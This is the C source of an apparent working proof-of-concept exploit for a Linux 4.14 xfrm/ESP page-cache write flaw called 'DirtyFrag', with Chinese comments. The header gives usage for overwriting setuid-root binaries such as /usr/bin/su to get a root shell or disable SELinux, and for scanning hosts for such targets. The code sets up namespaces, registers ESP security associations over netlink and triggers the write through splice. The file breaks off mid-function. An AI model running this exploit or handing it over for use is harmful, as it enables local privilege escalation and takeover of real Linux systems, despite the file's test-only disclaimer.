// SPDX-License-Identifier: MIT
/*
 * dirtyfrag_poc.c -- CVE-2026-43284 "DirtyFrag" (xfrm/ESP page-cache write)
 *
 * 目标内核: Linux 4.14.186
 *
 * ---------------------------------------------------------------------------
 * 一、漏洞原理 (与 4.14.186 源码逐条对齐)
 *
 *   net/ipv4/esp4.c: esp_input()
 *
 *     if (!skb_cloned(skb)) {
 *         if (!skb_is_nonlinear(skb)) { nfrags = 1; goto skip_cow; }
 *         else if (!skb_has_frag_list(skb)) {
 *                 nfrags = skb_shinfo(skb)->nr_frags; nfrags++;
 *                 goto skip_cow;                    <-- 4.14.186 走这里
 *         }
 *     }
 *     err = skb_cow_data(skb, 0, &trailer);          <-- 被跳过
 *   skip_cow:
 *     aead_request_set_crypt(req, sg, sg, elen + ivlen, iv);   // 原地解密
 *
 *   socket 的 sendpage 路径会把 page cache 页挂进 skb frag:
 *
 *     splice(file -> pipe)         引用 page cache page
 *     splice(pipe -> udp socket)   generic_splice_sendpage
 *                                    -> sock_sendpage -> udp_sendpage
 *                                    -> ip_append_page
 *                                    -> skb_append_pagefrags
 *
 *   于是 esp_input() 的原地解密改写的正是文件页缓存。4.14 没有
 *   skb_has_shared_frag(), 不存在修复判断。
 *
 *   crypto/authencesn.c: crypto_authenc_esn_decrypt()  (ESN 模式)
 *
 *     scatterwalk_map_and_copy(tmp + 1, dst, assoclen + cryptlen, 4, 1);
 *                                                ^^^ 4 字节任意 STORE
 *
 *   tmp[1] = ESP 头 seq_hi, 来自 SA 的 XFRMA_REPLAY_ESN_VAL.seq_hi,
 *   完全由用户态控制。认证失败(-EBADMSG)发生在 STORE 之后, 不影响写入。
 *
 *   本 PoC 的包布局 (24 字节 ESP 头 + 16 字节文件数据):
 *     encap_rcv 先 pull 走 ESP 头 8 字节, esp_input 再 pull 走 IV 16 字节,
 *     frag 里只剩文件页; 最终 STORE 落在 assoclen(12)+cryptlen(16)=28,
 *     正好是文件被 splice 的 16 字节起始处。
 *
 * ---------------------------------------------------------------------------
 * 二、能力要求
 *
 *   unshare(CLONE_NEWUSER | CLONE_NEWNET) -> userns root -> CAP_NET_ADMIN
 *   不需要宿主 root, 只要内核允许非特权 userns。
 *
 *   config: CONFIG_XFRM, CONFIG_INET_ESP, CONFIG_INET_UDP_DIAG,
 *           CONFIG_CRYPTO_AUTHENC, CONFIG_CRYPTO_AES, CONFIG_CRYPTO_CBC,
 *           CONFIG_CRYPTO_HMAC, CONFIG_CRYPTO_SHA256
 *
 * ---------------------------------------------------------------------------
 * 三、编译 / 用法
 *
 *   gcc -O2 -o poc dirtyfrag_poc.c
 *
 *   ./poc -to <目标文件> -set <替换内容文件>      分批写入, 默认执行
 *   ./poc -to <目标文件> -set <替换内容文件> -noexec
 *   ./poc -to <目标文件> -set <替换内容文件> -offset <n>
 *   ./poc -disable_selinux -to <setuid root 文件>  内置 payload: setenforce 0
 *   ./poc -disable_selinux                       已是 root 时直接写 sysfs
 *   ./poc -root-shell -to <setuid root 文件>      内置 payload: setuid(0) + /bin/sh
 *   ./poc -test                                  自测, 不碰系统文件
 *   ./poc -find                                  扫描本机 setuid root 文件, 评估哪些可作目标
 *   ./poc -check                                 检查内核配置 (y/m 即过; 若为模块则进一步检测是否已加载)
 *
 *   例:
 *     ./poc -test
 *     ./poc -to /usr/bin/su -set ./root_bash_elf -noexec
 *     ./poc -to /usr/bin/su -set ./root_bash_elf
 *     ./poc -to /usr/bin/su -set ./text_patch -offset 0x1000 -noexec
 *     ./poc -disable_selinux -to /usr/bin/su
 *
 *   -to   必须是 setuid root 且全局可读的文件 (如 /usr/bin/su, 4755)。
 *   -set  内容从文件 0 偏移读取, 从目标文件的 -offset 处开始写。
 *         长度按 4 字节对齐, 不足补 0。
 *   -offset <n>  目标文件写入起始偏移, 默认 0, 支持 0x 前缀。
 *         打 ELF 的 .text 段时从 0x1000 / 0x2000 这类偏移写,
 *         注意末批仍需要一个完整的 16 字节读取窗口。
 *   -disable_selinux  写入内置 payload (setuid(0) 后向
 *         /sys/fs/selinux/enforce 写 "0"), 执行后回读 enforce 状态。
 *         非 root 时必须配 -to <setuid root 文件>, 不能与 -set 同用。
 *   -root-shell  写入内置 payload (setuid(0) 后 execve("/bin/sh")),
 *         执行后得到一个 root shell; 必须配 -to <setuid root 文件>。
 *   -noexec  只写不执行。
 *
 * ---------------------------------------------------------------------------
 * 四、-set 的 payload
 *
 *   它会在 root 身份下被 execve, 所以给一个最小 ELF 即可:
 *
 *     setgid(0); setuid(0); setgroups(0, NULL);
 *     execve("/bin/bash", NULL, NULL);
 *
 *   arm64 和 x86_64 的 payload 不同, e_machine 必须匹配。
 *   也可以直接 -set /usr/bin/bash 的副本, 但那样不会提权 (只是复制文件),
 *   必须是能主动 execve 的 ELF。
 *
 * ---------------------------------------------------------------------------
 * 五、免责
 *
 *   仅用于你拥有授权的一次性测试环境。覆写只发生在 page cache,
 *   不落盘; drop_caches 或重启后失效。
 */

#define _GNU_SOURCE

#include <dirent.h>
#include <elf.h>
#include <errno.h>
#include <fcntl.h>
#include <limits.h>
#include <poll.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

#include <arpa/inet.h>
#include <net/if.h>
#include <netinet/in.h>
#include <sched.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <sys/utsname.h>
#include <sys/wait.h>

#include <linux/keyctl.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/xfrm.h>

#ifndef UDP_ENCAP
#define UDP_ENCAP 100
#endif
#ifndef UDP_ENCAP_ESPINUDP
#define UDP_ENCAP_ESPINUDP 2
#endif
#ifndef SOL_UDP
#define SOL_UDP 17
#endif

/* ---- 与包布局强耦合, 勿随意改 ---- */
#define ENC_PORT    4500
#define SEQ_VAL     200        /* 包内 ESP seq_no, 只影响 replay 窗口判断 */
#define REPLAY_SEQ  200        /* SA 的 replay_esn->seq: 与 SEQ_VAL 对齐, 避免被判为窗口外 */
#define SPI_BASE    0xDEADBE10u
#define MAX_PAYLOAD (4096 * 4) /* 最多 4096 个 SA */

static int g_verbose;
static int g_delay_ms = 20;   /* 每批触发后的等待, 影响写入可靠性/脏页回写 */
static int g_force;

#if defined(__aarch64__)
# define HOST_EM_VAL EM_AARCH64
#elif defined(__x86_64__)
# define HOST_EM_VAL EM_X86_64
#elif defined(__arm__)
# define HOST_EM_VAL EM_ARM
#elif defined(__i386__)
# define HOST_EM_VAL EM_386
#else
# define HOST_EM_VAL 0
#endif

/* ---- 日志颜色 (仅终端启用, 尊重 NO_COLOR 环境变量) ---- */
#define CLR_RST    "\033[0m"
#define CLR_RED    "\033[31m"
#define CLR_GREEN  "\033[32m"
#define CLR_YELLOW "\033[33m"
#define CLR_CYAN   "\033[36m"
#define CLR_DIM    "\033[2m"

static int color_enabled(void)
{
	static int cached = -1;

	if (cached < 0) {
		const char *no = getenv("NO_COLOR");

		cached = isatty(STDOUT_FILENO) && (!no || !*no);
	}
	return cached;
}

/*
 * 带颜色的输出: 按行首标记整行着色, 末尾复位。
 *   [+] 绿  [-] 红  [!] 黄  [*] 青  其余 (帮助/续行) 保持默认。
 * 输出被重定向到文件/管道时自动关色, 避免转义符污染日志。
 */
static void pmsg(const char *fmt, ...)
{
	char buf[2048];
	const char *color = NULL;
	va_list ap;

	va_start(ap, fmt);
	vsnprintf(buf, sizeof(buf), fmt, ap);
	va_end(ap);

	if (!color_enabled()) {
		fputs(buf, stdout);
		return;
	}

	if (!strncmp(buf, "[+]", 3))
		color = CLR_GREEN;
	else if (!strncmp(buf, "[-]", 3))
		color = CLR_RED;
	else if (!strncmp(buf, "[!]", 3))
		color = CLR_YELLOW;
	else if (!strncmp(buf, "[*]", 3))
		color = CLR_CYAN;

	if (color)
		fprintf(stdout, "%s%s%s", color, buf, CLR_RST);
	else
		fputs(buf, stdout);
}

/* 单调时钟毫秒, 只用于日志计时 */
static long long now_ms(void)
{
	struct timespec ts;

	clock_gettime(CLOCK_MONOTONIC, &ts);
	return (long long)ts.tv_sec * 1000 + ts.tv_nsec / 1000000;
}

#define LOG(fmt, ...)                                                    \
	do {                                                             \
		if (g_verbose)                                           \
			fprintf(stderr, "%s[df] " fmt "%s\n",             \
				color_enabled() ? CLR_DIM : "",           \
				##__VA_ARGS__,                            \
				color_enabled() ? CLR_RST : "");          \
	} while (0)

/* 无 -v 也输出的告警, 黄色 */
#define WARN(fmt, ...)                                                   \
	do {                                                             \
		fprintf(stderr, "%s" fmt "%s\n",                          \
			color_enabled() ? CLR_YELLOW : "",                 \
			##__VA_ARGS__,                                     \
			color_enabled() ? CLR_RST : "");                   \
	} while (0)

/* ======================================================================== */
/* 命名空间 / 网络准备                                                       */
/* ======================================================================== */

static int write_proc(const char *path, const char *buf)
{
	int fd = open(path, O_WRONLY);
	int n;

	if (fd < 0)
		return -1;
	n = write(fd, buf, strlen(buf));
	close(fd);
	return n;
}

static int setup_userns_netns(int no_userns)
{
	char map[64];

	if (!no_userns) {
		uid_t uid = getuid();
		gid_t gid = getgid();

		if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0) {
			LOG("unshare: %s", strerror(errno));
			return -1;
		}
		write_proc("/proc/self/setgroups", "deny");
		snprintf(map, sizeof(map), "0 %u 1", (unsigned)uid);
		if (write_proc("/proc/self/uid_map", map) < 0) {
			LOG("uid_map: %s", strerror(errno));
			return -1;
		}
		snprintf(map, sizeof(map), "0 %u 1", (unsigned)gid);
		if (write_proc("/proc/self/gid_map", map) < 0) {
			LOG("gid_map: %s", strerror(errno));
			return -1;
		}
		pmsg("[*] userns: uid 0 <- %u, gid 0 <- %u (setgroups=deny)\n",
		       (unsigned)uid, (unsigned)gid);
		pmsg("[*] netns: 独立 network namespace, 拥有完整 CAP_NET_ADMIN\n");
	} else {
		pmsg("[*] -no-userns: 使用当前 namespace\n");
	}

	{
		int s = socket(AF_INET, SOCK_DGRAM, 0);
		struct ifreq ifr;

		if (s < 0)
			return -1;
		memset(&ifr, 0, sizeof(ifr));
		strncpy(ifr.ifr_name, "lo", IFNAMSIZ - 1);
		if (ioctl(s, SIOCGIFFLAGS, &ifr) < 0) {
			close(s);
			return -1;
		}
		ifr.ifr_flags |= IFF_UP | IFF_RUNNING;
		if (ioctl(s, SIOCSIFFLAGS, &ifr) < 0) {
			close(s);
			return -1;
		}
		close(s);
		pmsg("[*] lo 已置 IFF_UP|IFF_RUNNING\n");
	}
	return 0;
}

/* ======================================================================== */
/* XFRM: 注册带 ESN 的 ESP SA                                                */
/* ======================================================================== */

static void put_attr(struct nlmsghdr *nlh, int type, const void *data,
		     size_t len)
{
	struct rtattr *rta =
		(struct rtattr *)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len));

	rta->rta_type = type;
	rta->rta_len = RTA_LENGTH(len);
	memcpy(RTA_DATA(rta), data, len);
	nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + RTA_ALIGN(rta->rta_len);
}

/* 一次 write_payload 只开一个 netlink socket, 所有 SA 复用 */
static int xfrm_netlink_open(void)
{
	int sk;
	struct sockaddr_nl nl;

	sk = socket(AF_NETLINK, SOCK_RAW, NETLINK_XFRM);
	if (sk < 0) {
		LOG("NETLINK_XFRM socket: %s", strerror(errno));
		return -1;
	}
	memset(&nl, 0, sizeof(nl));
	nl.nl_family = AF_NETLINK;
	if (bind(sk, (struct sockaddr *)&nl, sizeof(nl)) < 0) {
		LOG("netlink bind: %s", strerror(errno));
		close(sk);
		return -1;
	}
	/*
	 * 收 ACK 超时: 批量注册时若某个 SA 内核没回 ACK, 没有超时会永久阻塞。
	 * 5s 足够宽松, 超时后 recv 返回 -1(EAGAIN), 由调用方记失败继续。
	 */
	{
		struct timeval tv = { 5, 0 };

		setsockopt(sk, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
	}
	return sk;
}

/*
 * patch_seqhi 就是被 STORE 进 page cache 的那 4 字节。
 * 按网络字节序语义构造: b0<<24 | b1<<16 | b2<<8 | b3 -> 文件里 b0 b1 b2 b3
 *
 * 只构建 NEWSA 消息, 不发送。返回消息长度, 失败返回 -1。
 */
static int build_xfrm_sa_msg(char *buf, size_t bufsz, uint32_t spi,
			     uint32_t patch_seqhi)
{
	struct nlmsghdr *nlh;
	struct xfrm_usersa_info *xs;

	if (bufsz < 1024)
		return -1;

	memset(buf, 0, bufsz);
	nlh = (struct nlmsghdr *)buf;
	nlh->nlmsg_type  = XFRM_MSG_NEWSA;
	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
	nlh->nlmsg_pid   = (uint32_t)getpid();
	nlh->nlmsg_seq   = spi;
	nlh->nlmsg_len   = NLMSG_LENGTH(sizeof(struct xfrm_usersa_info));

	xs = (struct xfrm_usersa_info *)NLMSG_DATA(nlh);
	xs->id.daddr.a4 = inet_addr("127.0.0.1");
	xs->id.spi      = htonl(spi);
	xs->id.proto    = IPPROTO_ESP;
	xs->saddr.a4    = inet_addr("127.0.0.1");
	xs->family      = AF_INET;
	xs->mode        = XFRM_MODE_TRANSPORT;
	xs->replay_window = 0;
	xs->reqid       = 0x1234;
	xs->flags       = XFRM_STATE_ESN;
	xs->lft.soft_byte_limit   = (uint64_t)-1;
	xs->lft.hard_byte_limit   = (uint64_t)-1;
	xs->lft.soft_packet_limit = (uint64_t)-1;
	xs->lft.hard_packet_limit = (uint64_t)-1;
	xs->sel.family    = AF_INET;
	xs->sel.prefixlen_d = 32;
	xs->sel.prefixlen_s = 32;
	xs->sel.daddr.a4  = inet_addr("127.0.0.1");
	xs->sel.saddr.a4  = inet_addr("127.0.0.1");

	{
		char alg[sizeof(struct xfrm_algo_auth) + 32];
		struct xfrm_algo_auth *aa = (struct xfrm_algo_auth *)alg;

		memset(alg, 0, sizeof(alg));
		strncpy(aa->alg_name, "hmac(sha256)", sizeof(aa->alg_name) - 1);
		aa->alg_key_len   = 32 * 8;
		aa->alg_trunc_len = 128;
		memset(aa->alg_key, 0xAA, 32);
		put_attr(nlh, XFRMA_ALG_AUTH_TRUNC, alg, sizeof(alg));
	}
	{
		char alg[sizeof(struct xfrm_algo) + 16];
		struct xfrm_algo *ea = (struct xfrm_algo *)alg;

		memset(alg, 0, sizeof(alg));
		strncpy(ea->alg_name, "cbc(aes)", sizeof(ea->alg_name) - 1);
		ea->alg_key_len = 16 * 8;
		memset(ea->alg_key, 0xBB, 16);
		put_attr(nlh, XFRMA_ALG_CRYPT, alg, sizeof(alg));
	}
	{
		struct xfrm_encap_tmpl enc;

		memset(&enc, 0, sizeof(enc));
		enc.encap_type  = UDP_ENCAP_ESPINUDP;
		enc.encap_sport = htons(ENC_PORT);
		enc.encap_dport = htons(ENC_PORT);
		put_attr(nlh, XFRMA_ENCAP, &enc, sizeof(enc));
	}
	{
		char esn[sizeof(struct xfrm_replay_state_esn) + 4];
		struct xfrm_replay_state_esn *re =
			(struct xfrm_replay_state_esn *)esn;

		memset(esn, 0, sizeof(esn));
		/*
		 * replay_window 必须非零: 传 0 会被内核 NEWSA 校验直接 -EINVAL
		 * (实测 5.4: "NEWSA: Invalid argument")。
		 *
		 * 真正的关键在别处: 把 SA 的 seq (REPLAY_SEQ) 对齐到包内
		 * seq (SEQ_VAL), 令入站 xfrm_replay_check_esn() 的 seq 差值为 0,
		 * 落进窗口内, 避免包在 esp_input() 的 STORE 之前被当窗口外丢弃。
		 */
		re->bmp_len       = 1;
		re->seq           = REPLAY_SEQ;
		re->seq_hi        = patch_seqhi;   /* <== 被写入的 4 字节 */
		re->replay_window = 32;
		put_attr(nlh, XFRMA_REPLAY_ESN_VAL, esn, sizeof(esn));
	}

	return (int)nlh->nlmsg_len;
}

/*
 * 收 ACK, 正确处理"一次 recv 返回多条 nlmsghdr"的情况。
 *
 * 内核完全可能把多个 NLMSG_ERROR 合并进一个 datagram; 旧实现只解析首条,
 * 批量(NL_BATCH=512)时会导致后续 ACK 错位甚至阻塞。这里每次 recv 后用
 * NLMSG_NEXT 遍历 buffer 内全部消息, 按 nlmsg_seq 归位:
 *     idx = nlmsg_seq - spi_base      (nlmsg_seq 被设为 spi)
 * 只统计落在 [0,count) 的 ACK, 攒够 want 个即返回。
 * 返回有效 ACK 数; recv 出错或超时(SO_RCVTIMEO)返回 -1。
 */
static int xfrm_recv_acks(int sk, uint32_t spi_base, size_t count,
			  int *errs, size_t want)
{
	char rbuf[8192];
	size_t got = 0;

	while (got < want) {
		ssize_t n;
		struct nlmsghdr *rh;
		int rem;

		do {
			n = recv(sk, rbuf, sizeof(rbuf), 0);
		} while (n < 0 && errno == EINTR);
		if (n <= 0)
			return -1;

		rh = (struct nlmsghdr *)rbuf;
		rem = (int)n;
		while (rem >= (int)sizeof(struct nlmsghdr) &&
		       NLMSG_OK(rh, rem)) {
			if (rh->nlmsg_type == NLMSG_ERROR) {
				struct nlmsgerr *e =
					(struct nlmsgerr *)NLMSG_DATA(rh);
				size_t idx =
					(size_t)(rh->nlmsg_seq - spi_base);

				if (idx < count) {
					errs[idx] = e->error;
					got++;
				} else {
					LOG("ACK seq=0x%08x 不在本次范围",
					    rh->nlmsg_seq);
				}
			}
			{
				int step = NLMSG_ALIGN(rh->nlmsg_len);

				rem -= step;
				rh = (struct nlmsghdr *)((char *)rh + step);
			}
		}
	}
	return (int)got;
}

/* 单个: 构建 + 发送 + 收 ACK, 供 -test 使用 */
static int add_xfrm_sa(int sk, uint32_t spi, uint32_t patch_seqhi)
{
	char buf[4096];
	int len, err = 0, got;

	len = build_xfrm_sa_msg(buf, sizeof(buf), spi, patch_seqhi);
	if (len < 0)
		return -1;
	if (send(sk, buf, len, 0) < 0) {
		LOG("netlink send: %s", strerror(errno));
		return -1;
	}
	got = xfrm_recv_acks(sk, spi, 1, &err, 1);
	if (got < 0) {
		LOG("netlink recv: %s", strerror(errno));
		return -1;
	}
	if (err) {
		LOG("NEWSA spi=0x%08x: %s", spi, strerror(-err));
		return -1;
	}
	return 0;
}

/*
 * 批量注册: 每 NL_BATCH 个先全部 send 出去, 再集中 recv 等量 ACK。
 * ACK 按 nlmsg_seq 归位 (seq == spi == spi_base + 全局索引),
 * 所以即使内核回 ACK 顺序有偏差也不会张冠李戴。
 */
#define NL_BATCH 512

static int xfrm_register_all(int sk, uint32_t spi_base,
			     const uint32_t *seqhis, size_t count)
{
	char buf[4096];
	int *errs;
	size_t i, j, acked = 0;
	long long t0 = now_ms();
	int rc = -1;

	errs = calloc(count, sizeof(*errs));
	if (!errs)
		return -1;

	for (i = 0; i < count; i += NL_BATCH) {
		size_t n = count - i;
		size_t base = i;

		if (n > NL_BATCH)
			n = NL_BATCH;

		LOG("注册批 spi 0x%08x..0x%08x (%zu 个)",
		    spi_base + (uint32_t)base,
		    spi_base + (uint32_t)(base + n - 1), n);

		/* 先全部发完, 不在 send 之间插 recv */
		for (j = 0; j < n; j++) {
			int len = build_xfrm_sa_msg(buf, sizeof(buf),
						    spi_base + (uint32_t)(base + j),
						    seqhis[base + j]);

			if (len < 0)
				goto out;
			if (send(sk, buf, len, 0) < 0) {
				LOG("netlink send: %s", strerror(errno));
				goto out;
			}
		}

		/* 再集中收这一批的 ACK (一个 datagram 可能含多条, 全部解析) */
		{
			int got = xfrm_recv_acks(sk, spi_base, count, errs, n);

			if (got < 0) {
				LOG("netlink recv: %s", strerror(errno));
				goto out;
			}
			acked += (size_t)got;
		}

		if (count > NL_BATCH)
			pmsg("[*] SA 注册进度: %zu/%zu (spi 到 0x%08x)\n",
			       base + n, count, spi_base + (uint32_t)(base + n - 1));
	}

	for (i = 0; i < count; i++) {
		if (errs[i]) {
			pmsg("[-] SA #%zu spi=0x%08x 注册失败: %s\n",
			       i, spi_base + (uint32_t)i,
			       strerror(errs[i] < 0 ? -errs[i] : errs[i]));
			goto out;
		}
	}
	pmsg("[*] SA 注册完成: %zu/%zu 个 ACK, 耗时 %lld ms\n",
	       acked, count, now_ms() - t0);
	rc = 0;
out:
	free(errs);
	return rc;
}

/* 构建 XFRM_MSG_DELSA, 只带 usersa_id (daddr/spi/proto 匹配即可) */
static int build_xfrm_del_msg(char *buf, size_t bufsz, uint32_t spi)
{
	struct nlmsghdr *nlh;
	struct xfrm_usersa_id *id;

	if (bufsz < 256)
		return -1;

	memset(buf, 0, bufsz);
	nlh = (struct nlmsghdr *)buf;
	nlh->nlmsg_type  = XFRM_MSG_DELSA;
	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
	nlh->nlmsg_pid   = (uint32_t)getpid();
	nlh->nlmsg_seq   = spi;
	nlh->nlmsg_len   = NLMSG_LENGTH(sizeof(struct xfrm_usersa_id));

	id = (struct xfrm_usersa_id *)NLMSG_DATA(nlh);
	id->daddr.a4 = inet_addr("127.0.0.1");
	id->spi      = htonl(spi);
	id->family   = AF_INET;
	id->proto    = IPPROTO_ESP;

	return (int)nlh->nlmsg_len;
}

/*
 * 批量删除, 节奏与注册相同。
 * DELSA 返回 -ESRCH 说明 SA 已不存在, 视为成功。
 */
static int xfrm_delete_all(int sk, uint32_t spi_base, size_t count)
{
	char buf[4096];
	int *errs;
	size_t i, j, acked = 0, gone = 0;
	long long t0 = now_ms();
	int rc = -1;

	errs = calloc(count, sizeof(*errs));
	if (!errs)
		return -1;

	for (i = 0; i < count; i += NL_BATCH) {
		size_t n = count - i;
		size_t base = i;

		if (n > NL_BATCH)
			n = NL_BATCH;

		LOG("删除批 spi 0x%08x..0x%08x (%zu 个)",
		    spi_base + (uint32_t)base,
		    spi_base + (uint32_t)(base + n - 1), n);

		for (j = 0; j < n; j++) {
			int len = build_xfrm_del_msg(buf, sizeof(buf),
						     spi_base + (uint32_t)(base + j));

			if (len < 0)
				goto out;
			if (send(sk, buf, len, 0) < 0) {
				LOG("netlink send DELSA: %s", strerror(errno));
				goto out;
			}
		}

		/* 收这一批 DELSA 的 ACK (同样要处理 datagram 内多条) */
		{
			int got = xfrm_recv_acks(sk, spi_base, count, errs, n);

			if (got < 0) {
				LOG("netlink recv DELSA: %s", strerror(errno));
				goto out;
			}
			acked += (size_t)got;
		}

		if (count > NL_BATCH)
			pmsg("[*] SA 删除进度: %zu/%zu (spi 到 0x%08x)\n",
			       base + n, count, spi_base + (uint32_t)(base + n - 1));
	}

	rc = 0;
	for (i = 0; i < count; i++) {
		if (errs[i] && errs[i] != -ESRCH) {
			pmsg("[-] DELSA #%zu spi=0x%08x: %s\n",
			       i, spi_base + (uint32_t)i, strerror(-errs[i]));
			rc = -1;
		} else if (errs[i] == -ESRCH) {
			gone++;
		}
	}
	if (rc == 0)
		pmsg("[*] SA 删除完成: %zu/%zu 个 ACK%s, 耗时 %lld ms\n",
		       acked, count,
		       gone ? " (部分已不存在, 视为成功)" : "",
		       now_ms() - t0);
out:
	free(errs);
	return rc;
}

/* ======================================================================== */
/* 触发: splice(page cache) -> UDP socket -> esp_input 原地解密              */
/* ======================================================================== */

/* 建一对 UDP socket: recv 绑定 ENC_PORT + UDP_ENCAP, send 连接过去 */
static int udp_socks_open(int *recv_out, int *send_out)
{
	int sk_recv, sk_send, encap = UDP_ENCAP_ESPINUDP, one = 1;
	struct sockaddr_in dst;

	memset(&dst, 0, sizeof(dst));
	dst.sin_family      = AF_INET;
	dst.sin_port        = htons(ENC_PORT);
	dst.sin_addr.s_addr = inet_addr("127.0.0.1");

	sk_recv = socket(AF_INET, SOCK_DGRAM, 0);
	if (sk_recv < 0) {
		LOG("socket recv: %s", strerror(errno));
		return -1;
	}
	setsockopt(sk_recv, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
	if (bind(sk_recv, (struct sockaddr *)&dst, sizeof(dst)) < 0) {
		LOG("bind recv: %s", strerror(errno));
		close(sk_recv);
		return -1;
	}
	if (setsockopt(sk_recv, IPPROTO_UDP, UDP_ENCAP, &encap,
		       sizeof(encap)) < 0) {
		LOG("UDP_ENCAP: %s", strerror(errno));
		close(sk_recv);
		return -1;
	}

	sk_send = socket(AF_INET, SOCK_DGRAM, 0);
	if (sk_send < 0) {
		close(sk_recv);
		return -1;
	}
	if (connect(sk_send, (struct sockaddr *)&dst, sizeof(dst)) < 0) {
		LOG("connect: %s", strerror(errno));
		close(sk_send);
		close(sk_recv);
		return -1;
	}

	*recv_out = sk_recv;
	*send_out = sk_send;
	return 0;
}

/*
 * 单次触发: 把目标文件 offset 处的 16 字节窗口 + 24 字节 ESP 头送进 loopback。
 * sk_recv / sk_send 由调用者复用, 这里不再创建/销毁。
 */
static int do_one_write(int sk_recv, int sk_send, const char *path,
			off_t offset, uint32_t spi)
{
	int file_fd, pfd[2];
	uint8_t hdr[24];
	struct iovec iov;
	off_t off = offset;
	ssize_t s_in, s_out;

	(void)sk_recv;   /* 收包由内核 xfrm4_udp_encap_rcv 处理, 这里只管发 */

	file_fd = open(path, O_RDONLY);
	if (file_fd < 0) {
		LOG("open(%s): %s", path, strerror(errno));
		return -1;
	}

	if (pipe(pfd) < 0) {
		LOG("pipe: %s", strerror(errno));
		close(file_fd);
		return -1;
	}

	memset(hdr, 0, sizeof(hdr));
	*(uint32_t *)(hdr + 0) = htonl(spi);
	*(uint32_t *)(hdr + 4) = htonl(SEQ_VAL);
	memset(hdr + 8, 0xCC, 16);

	iov.iov_base = hdr;
	iov.iov_len  = sizeof(hdr);
	if (vmsplice(pfd[1], &iov, 1, 0) != (ssize_t)sizeof(hdr)) {
		LOG("vmsplice: %s", strerror(errno));
		goto fail;
	}
	s_in = splice(file_fd, &off, pfd[1], NULL, 16, SPLICE_F_MOVE);
	if (s_in != 16) {
		static int shown;

		if (!shown) {
			shown = 1;
			WARN("[df] splice(file->pipe) 在 offset %lld 只拿到 "
			     "%zd/16 字节: %s",
			     (long long)offset, s_in, strerror(errno));
			WARN("[df] ESP 每批需要一个 16 字节读取窗口, "
			     "目标文件在该 offset 之后不足 16 字节");
		}
		goto fail;
	}
	/* 即便返回 -1 也可能已解密, 结果由回读校验判断 */
	s_out = splice(pfd[0], NULL, sk_send, NULL, 24 + 16, SPLICE_F_MOVE);
	LOG("off=0x%llx spi=0x%08x splice_in=%zd sendpage=%zd",
	    (long long)offset, spi, s_in, s_out);
	if (g_delay_ms > 0)
		usleep((useconds_t)g_delay_ms * 1000);

	close(file_fd);
	close(pfd[0]);
	close(pfd[1]);
	return s_out == 40 ? 0 : -1;

fail:
	close(file_fd);
	close(pfd[0]);
	close(pfd[1]);
	return -1;
}

/* ======================================================================== */
/* 写入前安全检查                                                           */
/* ======================================================================== */

/*
 * 这里拦两类最致命的误用:
 *   1) -to 是符号链接 -> splice 跟随链接, 写的是链接目标。
 *      busybox 系统里 /bin/su -> /bin/busybox, 而当前 shell 就是 busybox,
 *      覆盖后当前 shell 的代码页同步被改, 立刻卡死/崩溃。
 *   2) -to 就是当前进程自身 -> 自杀。
 */
static int check_target(const char *to, int *is_suid)
{
	struct stat st, self;
	char real[PATH_MAX];
	ssize_t n;

	*is_suid = 0;

	if (lstat(to, &st) < 0) {
		pmsg("[-] lstat(%s): %s\n", to, strerror(errno));
		return -1;
	}

	if (S_ISLNK(st.st_mode)) {
		n = readlink(to, real, sizeof(real) - 1);
		if (n < 0)
			n = 0;
		real[n] = '\0';
		pmsg("[!] %s 是符号链接 -> %s\n", to, real);
		pmsg("[!] open/splice 会跟随链接, 实际改写的是目标文件本体\n");
		if (!g_force) {
			pmsg("[-] 已拒绝。-to 请给链接目标的真实路径, 或确认安全后加 -force\n");
			return -1;
		}
	}

	if (stat(to, &st) < 0) {
		pmsg("[-] stat(%s): %s\n", to, strerror(errno));
		return -1;
	}
	if (!S_ISREG(st.st_mode)) {
		pmsg("[-] %s 不是普通文件\n", to);
		return -1;
	}
	if (st.st_size < 64) {
		pmsg("[-] %s 只有 %lld 字节, 不像可执行文件\n", to,
		       (long long)st.st_size);
		return -1;
	}

	if (stat("/proc/self/exe", &self) == 0 && self.st_dev == st.st_dev &&
	    self.st_ino == st.st_ino) {
		pmsg("[-] 拒绝: %s 就是当前进程自己的可执行文件\n", to);
		return -1;
	}

	pmsg("[*] target: %s  mode=%04o size=%lld uid=%u gid=%u\n", to,
	       (unsigned)st.st_mode, (long long)st.st_size,
	       (unsigned)st.st_uid, (unsigned)st.st_gid);
	pmsg("[*] inode: dev=%llu ino=%llu nlink=%llu blocks=%llu\n",
	       (unsigned long long)st.st_dev, (unsigned long long)st.st_ino,
	       (unsigned long long)st.st_nlink, (unsigned long long)st.st_blocks);
	pmsg("[*] setuid/setgid: %s, 所有者 root: %s\n",
	       (st.st_mode & (S_ISUID | S_ISGID)) ? "有" : "无",
	       st.st_uid == 0 ? "是" : "否");

	*is_suid = !!(st.st_mode & (S_ISUID | S_ISGID));
	if (!*is_suid) {
		pmsg("[-] 没有 setuid/setgid 位: execve 后仍是当前用户, 不会提权\n");
		pmsg("[-] 需要 4755 root 的独立文件才能继续, 已退出\n");
		return -1;
	}
	return 0;
}

/* ======================================================================== */
/* 目标文件备份 / 恢复 (防止测试把系统 setuid 文件写坏)                      */
/* ======================================================================== */

/*
 * 把 src 整份复制到 /tmp 下的临时文件, 路径写进 out。成功返回 0。
 * 保留原文件 mode 的低 12 位 (含 setuid), 便于事后原样恢复。
 */
static int backup_file(const char *src, char *out, size_t outsz)
{
	char tmpl[] = "/tmp/dirtyfrag_bak_XXXXXX";
	char buf[65536];
	struct stat st;
	ssize_t n;
	int in, ofd, rc = -1;

	in = open(src, O_RDONLY);
	if (in < 0)
		return -1;
	ofd = mkstemp(tmpl);
	if (ofd < 0) {
		close(in);
		return -1;
	}
	while ((n = read(in, buf, sizeof(buf))) > 0) {
